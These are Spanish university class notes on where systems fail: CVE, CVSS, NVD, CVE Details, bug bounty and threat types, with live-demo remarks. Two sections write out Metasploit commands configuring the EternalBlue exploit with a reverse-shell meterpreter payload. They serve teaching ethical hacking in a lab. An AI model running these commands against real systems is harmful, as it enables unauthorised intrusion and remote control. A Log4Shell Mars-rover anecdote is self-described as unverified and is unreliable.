---
asignatura: Ciberseguridad
fecha: 2026-09-29
tema: Tema 1 (1.3 a 1.5) · Clase 3 · dónde falla un sistema (CVE, CVSS, NVD)
fuente: CIBER_Clase03_diapositivas.pdf (recibido dos veces, idéntico) + transcripción de la clase en directo
---
# Ciber · Clase 3 (29/09) · Dónde falla un sistema

> Anterior: [Lab 1](2026-09-24_lab1-paseo-por-kali.md) · Práctica: [CVE en el NVD](2026-09-29_practica-clase3-cve.md) · Siguiente (Clase 4): seguridad física y el SAI

> «Lo que nmap ve como una versión, el atacante lo ve como una lista de fallos con nombre.»

## 1.3 Dónde es vulnerable un sistema
**Hardware** (servidores, discos, red, energía) · **Software** (SO y apps: aquí viven los bugs y los CVE) · **Datos** (lo que importa: que no se copien ni alteren).
El atacante **no elige el sitio más importante, sino el más débil**: disco sin cifrar, app sin actualizar o backup abandonado valen igual.

## Vulnerabilidad vs amenaza vs riesgo
| Término | Qué es | Ejemplo |
|---|---|---|
| Vulnerabilidad | Fallo o debilidad del sistema | Apache con bug conocido sin parchear |
| Amenaza | Algo/alguien que puede aprovecharlo | Atacante por internet, un descuido, un incendio |
| Riesgo | Que la amenaza use el fallo, y el daño que haría | Ese Apache expuesto a internet y sin actualizar |

La misma vulnerabilidad da riesgos distintos según a qué esté expuesta. **El fallo se arregla; el riesgo se gestiona.**

## Dos tipos de vulnerabilidad
- **Conocidas**: publicadas, con CVE y nota, en el NVD; suele haber (o llegar) parche.
- **No conocidas / día cero (zero-day)**: sin publicar, sin CVE ni parche; fallo sin parche el día en que alguien lo usa. Las más peligrosas y caras. Aquí entra el **bug bounty**: cazar y reportar en vez de vender.

## CVE y CVSS
- **CVE** = identificador único (nombre). Formato `CVE-año-número` (ej. CVE-2017-0144: descubierto en 2017, fallo nº 0144 de ese año).
- **CVSS** = gravedad de 0 a 10; **no es una opinión**: se calcula con fórmula a partir del **vector** (ej. `AV:N/AC:L/...`). Calculadora oficial: nvd.nist.gov/vuln-metrics/cvss/v3-calculator.
- Con nombre y nota se prioriza: **primero se parchea lo alto y expuesto**.

### Cómo se monta un CVE
1. Alguien lo encuentra y lo reporta (investigador, empresa, cazador de bug bounty); **primero se avisa al fabricante en privado**.
2. Una autoridad le da número: **MITRE y las CNA** (en España, **INCIBE** es una).
3. Se publica la ficha; el **NVD** la analiza y calcula el CVSS → ya es «conocida».
Camino legal: reportar en privado → arreglar → publicar. Soltarlo sin avisar deja a todos expuestos.

## NVD y CVE Details
- **NVD** (nvd.nist.gov): base de datos pública del gobierno de EE. UU.; por CVE: nota, productos y versiones afectados, qué permite, desde cuándo se conoce.
- **CVE Details** (cvedetails.com): lo mismo por fabricante/producto, ordenable por CVSS.
- Flujo: `nmap -sV` da versión exacta → la buscas en NVD/CVE Details → lista de CVE («media auditoría»).
- **No hay que memorizar CVE; hay que saber buscarlos** (Actividad 2).

```bash
nmap -sV scanme.nmap.org   # 22/tcp OpenSSH 6.6 · 80/tcp Apache httpd 2.4.7  -> Apache 2.4.7: lista de CVE
```

## Ficha de ejemplo: CVE-2017-0144 (EternalBlue)
| Campo | Valor |
|---|---|
| CVSS | 8.1 · High |
| Vector | Por red, sin contraseña |
| Producto | Windows · protocolo SMBv1 |
| Impacto | Ejecución de código en la máquina |
«Por red y sin contraseña» es lo que lo hizo gusano mundial (**WannaCry**). Un fallo local no se propaga solo.

## De la ficha al exploit (Metasploit; solo se configura, NO se lanza)
```bash
msf6 > search ms17_010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.0.0.15                       # objetivo (con permiso)
msf6 > set LHOST 10.0.0.9                         # tu Kali (adonde vuelve la conexión)
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > show options                               # comprobar que no falta nada
# exploit  <- AQUÍ NO: se lanza en la Clase 23, con permiso y en el lab
```
Flujo del hacking ético: ver el fallo → elegir su exploit → darle datos del objetivo.

## Ejemplos reales de CVE
| Dónde | Ejemplo | Gravedad |
|---|---|---|
| SO Windows | EternalBlue · CVE-2017-0144 | Alta · 8.1 |
| SO Linux | PwnKit · CVE-2021-4034 | Alta · 7.8 |
| Gestor web WordPress | Decenas de CVE del CMS y plugins | varias |
| Librería Log4j | Log4Shell · CVE-2021-44228 | Crítica · 10 |
| Servidor web Apache | Salto de directorio · CVE-2021-41773 | Alta · 7.5 |

## 1.5 Tipos de amenaza
| Se clasifican por | Tipos |
|---|---|
| Origen | Natural, física o humana |
| Intención | Accidental o deliberada |
| Procedencia | Interna o externa |
| La más común | Malware y sus familias (virus, gusano, troyano, ransomware, spyware) |
La que más se olvida: la **de dentro y la del descuido**; no todo ataque lleva un atacante detrás.

## Bug bounty y mercado de fallos
| Vía | Qué es | Cuánto |
|---|---|---|
| Bug bounty (legal) | Reportar a la empresa (HackerOne, Bugcrowd) | Cientos a decenas de miles; crítica, seis cifras |
| Zerodium (mercado gris) | Compra día cero para revenderlo | Hasta 2,5 M por un fallo de móvil |
| Pwn2Own (concurso) | Hackear en directo | Synacktiv hackeó un Tesla: 200.000 $ y el coche |
| Mercado negro | Venderlo a quien lo va a usar | Sin ley; te la juegas |
En HackerOne se han pagado del orden de 80 M$ en un año. La diferencia entre recompensa, pastón o delito: **a quién se lo das y con qué permiso**.

## Cómo se une todo
**Activo** (lo que proteges) → **Vulnerabilidad** (su fallo: CVE + CVSS) → **Amenaza** (quién la aprovecha) → **Riesgo** (que se junten). El mismo CVE en internet y en red interna sin salida no da el mismo riesgo.

## Deberes (para la Clase 4)
Leer 1.3–1.5 · **Test 1** (ya abierto; entra todo el Tema 1; ½ punto) · trastear CVE Details con algo propio (router, CMS, servidor).
Clase 4: seguridad física y el SAI — «menos terminal y más sentido común, pero cae en el examen igual».

## Fuentes (de las diapositivas)
NVD nvd.nist.gov/vuln/search · cvedetails.com · Exploit-DB exploit-db.com · zerodium.com/program.html · zerodayinitiative.com · CCN-CERT · INCIBE-CERT · hackerone.com · bugcrowd.com

## Notas en directo (matices del profesor, no están en las diapositivas)

### Insiste otra vez: no son "pilares"
Repite la corrección que ya hizo en la Clase 2: la documentación dice "pilares" para hardware/software/datos, pero para él son **3 sitios donde puede fallar un sistema**, no pilares. Lo dice explícitamente al empezar la clase.
- **Hardware**: solo se puede atacar con acceso físico (equipos, discos, red, energía).
- **Software**: aquí no se usan exploits públicos a la ligera — avisa de que "todos tienen truco": un exploit descargado de cualquier lado puede, sin que te enteres, ejecutar un `rm -rf` en tu propia máquina en vez de en la del objetivo. Más adelante dará trucos para comprobarlos antes de lanzarlos.
- **Datos**: lo que de verdad importa proteger; el atacante no va al sitio más importante, va al **eslabón más débil**.

### Cómo funciona `nmap -sV` por dentro (no estaba explicado así en la práctica)
Lo que hace `nmap -sV` es, por cada puerto abierto, iniciar algo parecido a un **three-way handshake TCP** y quedarse "a medias" o mandar una petición pequeña: el servicio que está detrás suele responder con una cabecera o un *banner* que delata qué software y qué versión es. Con esa versión exacta ya se puede ir a buscar sus CVE. Puertos: de 0 a 65.535.

### Cómo se monta un CVE — ampliación con la razón de ser
- El problema de fondo que resuelve el CVE: si un investigador encuentra un fallo y lo publica directamente, la empresa afectada puede literalmente **denunciarle** a él por tocar su software. El CVE/CNA es el "árbitro" intermedio que legitima el aviso.
- Flujo tal y como lo cuenta: investigador encuentra el fallo → **no lo publica en foros** → lo notifica al NVD/CNA correspondiente → se abre un **plazo de tiempo** (ventana de divulgación responsable) para que el fabricante lo arregle → solo entonces se publica la ficha con nota y CVSS.
- El número de CVE es incremental **por año** y se reinicia en 0 al empezar el año siguiente (`CVE-2026-XXXX`, con XXXX creciendo según el mes: en septiembre ya hay números altos).
- Quien reporta gana: prestigio, dinero (bug bounty) o ambos — "¿me veis cara de ONG?", dice, dejando claro que nadie busca fallos gratis a ese nivel.
- Libro que recomienda sobre bug bounty: uno de la editorial **0xWord** (no dio el título exacto en este momento, solo "buscad 0xWord y bug bounty").

### Demo en directo: NVD con un CVE real de Chrome
Entró en nvd.nist.gov y abrió la ficha más reciente en ese momento: una vulnerabilidad de **Google Chrome**, **CVSS 8.8** (escala v3), que permite a un atacante remoto **ejecutar código arbitrario dentro del sandbox** del navegador a través de una página web maliciosa.
- Fecha de publicación: **29 de mayo**. Fecha de "modificado": **21 de julio**.
- Diálogo con Manuel sobre por qué hay ~2 meses entre ambas fechas: coincide con la ventana de divulgación responsable explicada arriba (reportar → arreglar en privado → publicar), más el tiempo de analizar y puntuar en el NVD.
- Mensaje de fondo: **todas las actualizaciones de Chrome, Apple, etc. son de seguridad** — no son solo "mejoras".

### Demo en directo: CVE Details, la web que más le gusta ("muy gráfico")
Cambia a **cvedetails.com** porque, a diferencia del NVD (más textual), aquí se navega visualmente por año, fabricante y producto:
- **2025**: unas **62.000** vulnerabilidades reportadas en total (cifra que dio en clase, acumulado del año, no una media).
- Tipos de vulnerabilidad que señaló como sus favoritos para explicar: **inyección SQL** ("la típica"), **file inclusion / LFI** (su favorito — "me mola mazo", porque se hace a través de la URL, "ir para atrás y buscar cosas") y **ejecución remota de código** (el que más destaca como peligroso: "es un terremoto en tu ordenador").
- **WordPress**: buscó por producto y mostró que la versión **7.1.1 tiene una vulnerabilidad con CVSS 8.1**, mientras que la **7.1.2 (la última en ese momento) no tiene ninguna conocida** → conclusión práctica: mantener WordPress siempre actualizado a la última versión.
- **Microsoft Word**: también tiene CVE por decenas; mencionó una versión para Mac con **93 vulnerabilidades** registradas (y una entrada de 2016 comentada al vuelo por un alumno).
- **Adobe Reader**: CVE de **2019, CVSS 6.5**, descrito como un ataque de *bypass* que podría revelar información (fuga de información, sin ser crítico).
- Aclaración de un alumno: Adobe Flash no aparece porque ya no existe/no se sigue contando.

### Anécdota: Log4Shell y el rover de Marte
A propósito de **Log4Shell (CVE-2021-44228, Log4j)**, cuenta que la librería (de registro de logs en Java) la usan NASA, administraciones y "muchísimos sitios", y que la vulnerabilidad permitía inyectar código y conectarse a la máquina afectada solo por tener la librería cargada — "una auténtica barbaridad", CVSS 10. Manuel recuerda, sin estar 100% seguro de la fuente, una noticia (no ciencia-ficción) sobre un **rover en Marte** que se había quedado inoperativo por problemas de conexión con la antena y que fue posible **reactivarlo en remoto aprovechando esa misma vulnerabilidad**. Ninguno de los dos cierra el dato con una fuente exacta — queda como anécdota a verificar, no como hecho confirmado.

### Metasploit en directo contra EternalBlue (solo configuración, no se llega a lanzar con éxito)
Repite y amplía la demo de la Clase/Lab anteriores, esta vez explicando cada opción al rellenarla:
```bash
msfconsole
search eternalblue                                  # o: search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
info                                                  # describe el módulo: afecta a SMB/445, da CVE/CVSS
show options
set RHOST 10.0.0.15        # RHOST = la máquina objetivo (remote host)
set LHOST <mi IP de Kali>  # LHOST = yo, adonde vuelve la conexión (ya detectado solo)
set PAYLOAD windows/x64/meterpreter/reverse_tcp
show options                # para comprobar que ha quedado todo bien configurado
exploit                     # (o run) -> en la demo no hay máquina real escuchando: no consigue conectar
```
- **RHOST/RPORT**: el objetivo y su puerto (445, no hace falta tocarlo). **LHOST/LPORT**: quién soy yo y por dónde vuelve la conexión inversa (reverse shell). No hace falta contraseña porque el fallo es de protocolo, no de login.
- **Payload**: el código que se inyecta una vez dentro. El más usado es **Meterpreter** (disponible para Windows, Linux, etc.); una vez cargado permite, por ejemplo, descargar la lista de usuarios, instalar un keylogger, etc.
- En la demo real tecleó mal una IP (le faltaba un punto) — Manuel se lo corrigió en directo — y, aun corrigiéndolo, el `exploit` no llega a ningún lado porque no hay una máquina real vulnerable escuchando en ese momento: queda como ejemplo de la sintaxis, no como ataque completado.
- Aclara que con otros módulos auxiliares de Metasploit también se puede hacer **denegación de servicio** (hay módulos específicos para DoS), aunque eso "es otro mundo".
- Otros CVE que menciona de pasada en este bloque: **PwnKit** (Linux), **WPScan** (herramienta específica para auditar WordPress, "te lo tiene casi todo preparado"), salto de directorio en Apache.

### Amenazas (1.5) — ampliación
- Insiste en que el **insider / empleado descontento** es, para él, uno de los vectores de ataque más importantes en el mundo empresarial — más que el atacante externo. Recomienda vigilar el ambiente laboral y usar herramientas de detección adecuadas.
- **BYOD (Bring Your Own Device)**: lo critica abiertamente, sobre todo a raíz de la pandemia — con todo el mundo trabajando desde casa con ordenadores personales usados también para torrents y descargas, fue "uno de los periodos con más ataques en la historia de la ciberseguridad". Chiste recurrente: BYOD se le confunde con la marca de coches BYD.
- Familias de malware más comunes citadas: virus, gusano, troyano, ransomware.

### Bug bounty — por qué le interesa a una empresa (razonamiento económico)
Explica por qué Google/Apple/Microsoft prefieren pagar bug bounty en vez de contratar un pentester fijo: contratar a un experto concreto para que ataque es caro; abrir un programa público de recompensas permite tener, en la práctica, **pentesting gratuito de mucha gente a la vez** y solo pagar a quien realmente encuentra algo. Cifra que repite: del orden de **80 millones de dólares pagados en un año** vía HackerOne. Advierte seriamente de no vender nunca un fallo en el mercado negro: hay casos conocidos de gente localizada y perseguida por ello, "a por ti y a por tu familia".

### Cierre de la clase
Frase con la que resume el apartado de amenazas y vulnerabilidades: **hay dos tipos de empresas: las que tienen sus CVE sin parchear, y las que todavía no saben que los tienen** (conocidas vs. no conocidas). Deberes para el fin de semana (no puntúan): coger un CVE por CVE Details, situarlo en su "sitio" (activo→vulnerabilidad→amenaza→riesgo) y trastear metiendo el propio router o un CMS que no sea WordPress.
